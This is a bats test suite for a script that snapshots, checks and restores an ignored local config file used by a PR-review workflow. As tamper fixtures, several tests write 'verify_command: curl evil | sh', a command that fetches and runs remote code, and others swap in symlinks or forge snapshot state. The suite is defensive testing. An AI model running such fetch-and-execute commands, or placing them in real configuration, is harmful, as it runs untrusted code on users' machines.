#!/usr/bin/env bats
# Tests for guard-local-config (snapshot, check and restore of the ignored
# yellow-plugins.local.md that git status cannot see)

bats_require_minimum_version 1.5.0

SCRIPT="$(cd "$(dirname "${BATS_TEST_DIRNAME}")" && pwd)/skills/pr-review-workflow/scripts/guard-local-config"

setup() {
  export TMPDIR="$BATS_TEST_TMPDIR/tmp"
  mkdir -p "$TMPDIR"
  REPO="$BATS_TEST_TMPDIR/repo"
  mkdir -p "$REPO"
  cd "$REPO"
  git init -q .
  git config user.email t@example.com
  git config user.name t
  printf 'yellow-plugins.local.md\n' >| .gitignore
  git add .gitignore
  git commit -q -m init
  CFG="$REPO/yellow-plugins.local.md"
}

snap() {
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 0 ]
  # stdout: the snapshot path, then `digest=<hex>`.
  [ "${#lines[@]}" -eq 2 ]
  SNAP="${lines[0]}"
  [[ "${lines[1]}" == digest=* ]]
  DIGEST="${lines[1]#digest=}"
  [ -n "$DIGEST" ]
}

@test "an unchanged config checks clean and leaves the snapshot in place" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  [ -d "$SNAP" ]
}

@test "an edited config is reported, restored byte for byte and exits 3" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [[ "$output" == *"changed: yellow-plugins.local.md"* ]]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 0 ]
}

@test "a config created during the run is removed" {
  snap
  printf 'verify_command: evil\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [ ! -e "$CFG" ]
}

@test "a config deleted during the run is put back" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  rm -f "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a symlink swapped in for the config is replaced with the original file" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  rm -f "$CFG"
  printf 'x\n' >| "$BATS_TEST_TMPDIR/elsewhere"
  ln -s "$BATS_TEST_TMPDIR/elsewhere" "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [ ! -L "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a symlinked config cannot be guarded because its referent's bytes are not snapshotted" {
  printf 'verify_command: true\n' >| "$BATS_TEST_TMPDIR/elsewhere"
  ln -s "$BATS_TEST_TMPDIR/elsewhere" "$CFG"
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"it is a symlink"* ]]
  [ -z "$(ls "$TMPDIR")" ]
  # The referent is untouched and the link is left as found.
  [ "$(readlink "$CFG")" = "$BATS_TEST_TMPDIR/elsewhere" ]
}

@test "a dangling symlinked config cannot be guarded either" {
  ln -s "$BATS_TEST_TMPDIR/missing" "$CFG"
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 2 ]
  [ -z "$(ls "$TMPDIR")" ]
}

@test "a config that is a directory cannot be guarded" {
  mkdir "$CFG"
  run --separate-stderr "$SCRIPT" snapshot
  [ "$status" -eq 2 ]
  [ -z "$(ls "$TMPDIR")" ]
}

@test "a restore that fails exits 4 and names the path" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  # A cp that always fails: the staged restore never lands, so the tampered
  # file stays in place and check reports the failed restore.
  mkdir -p "$BATS_TEST_TMPDIR/shim"
  printf '#!/bin/sh\nexit 1\n' >| "$BATS_TEST_TMPDIR/shim/cp"
  chmod +x "$BATS_TEST_TMPDIR/shim/cp"
  PATH="$BATS_TEST_TMPDIR/shim:$PATH" run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"restore failed: yellow-plugins.local.md"* ]]
}

@test "a missing snapshot copy fails check and leaves the live config untouched" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  rm -f "$SNAP/copy.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
  [ -f "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
}

@test "a missing snapshot state fails check and leaves the live config untouched" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  rm -f "$SNAP/state.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [ "$(cat "$CFG")" = 'tampered' ]
}

@test "corrupted backup bytes are refused, not installed" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  printf 'verify_command: corrupted\n' >| "$SNAP/copy.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
}

@test "a missing recorded hash is refused" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  rm -f "$SNAP/hash.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [ "$(cat "$CFG")" = 'tampered' ]
}

@test "a state tampered from file to absent is refused and the live config is untouched" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  [ -f "$SNAP/copy.0" ]
  [ -f "$SNAP/hash.0" ]
  printf 'absent\n' >| "$SNAP/state.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
  [ -f "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a state, copy and hash rewritten together (file to absent) fails the digest and the live config survives" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'absent\n' >| "$SNAP/state.0"
  rm -f "$SNAP/copy.0" "$SNAP/hash.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: digest mismatch"* ]]
  [ -f "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a missing digest is a usage error" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP"
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check "$SNAP" ""
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check "$SNAP" "not a digest"
  [ "$status" -eq 2 ]
  [ "$(cat "$CFG")" = 'tampered' ]
}

@test "a wrong digest is refused and the live config is untouched" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "0123456789abcdef"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: digest mismatch"* ]]
  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
  # The right digest still restores.
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [ "$(cat "$CFG")" = 'verify_command: true' ]
}

@test "a digest from a different snapshot is refused" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  first="$DIGEST"
  printf 'verify_command: other\n' >| "$CFG"
  snap
  [ "$first" != "$DIGEST" ]
  printf 'tampered\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$first"
  [ "$status" -eq 4 ]
  [ "$(cat "$CFG")" = 'tampered' ]
}

@test "a state tampered to a symlink is refused and no link is created" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'symlink:/tmp/x\n' >| "$SNAP/state.0"
  printf 'verify_command: curl evil | sh\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [[ "$output" == *"snapshot invalid: yellow-plugins.local.md"* ]]
  [ ! -L "$CFG" ]
  [ "$(cat "$CFG")" = 'verify_command: curl evil | sh' ]
}

@test "a symlink state on an absent snapshot is refused and creates no link" {
  snap
  printf 'symlink:/tmp/x\n' >| "$SNAP/state.0"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 4 ]
  [ ! -e "$CFG" ]
  [ ! -L "$CFG" ]
}

@test "a genuine absent snapshot still restores to absent" {
  snap
  [ "$(cat "$SNAP/state.0")" = absent ]
  [ ! -e "$SNAP/copy.0" ]
  [ ! -e "$SNAP/hash.0" ]
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 0 ]
  printf 'verify_command: evil\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [[ "$output" == *"changed: yellow-plugins.local.md"* ]]
  [ ! -e "$CFG" ]
}

@test "a restore leaves no staging files beside the config" {
  printf 'verify_command: true\n' >| "$CFG"
  snap
  printf 'tampered\n' >| "$CFG"
  run --separate-stderr "$SCRIPT" check "$SNAP" "$DIGEST"
  [ "$status" -eq 3 ]
  [ -z "$(find "$REPO" -maxdepth 1 -name '.guard-restore.*')" ]
}

@test "check and clear refuse a directory the script did not mint" {
  mkdir "$TMPDIR/other"
  run --separate-stderr "$SCRIPT" check "$TMPDIR/other" abc123
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"snapshot directory rejected"* ]]
  run --separate-stderr "$SCRIPT" clear "$TMPDIR/other"
  [ "$status" -eq 2 ]
  [ -d "$TMPDIR/other" ]
  run --separate-stderr "$SCRIPT" check "/etc" abc123
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check "$TMPDIR/resolve-guard.x/../other" abc123
  [ "$status" -eq 2 ]
}

@test "clear removes the snapshot directory" {
  snap
  run --separate-stderr "$SCRIPT" clear "$SNAP"
  [ "$status" -eq 0 ]
  [ ! -e "$SNAP" ]
}

@test "usage errors exit 2" {
  run --separate-stderr "$SCRIPT"
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" check
  [ "$status" -eq 2 ]
  run --separate-stderr "$SCRIPT" snapshot extra
  [ "$status" -eq 2 ]
}
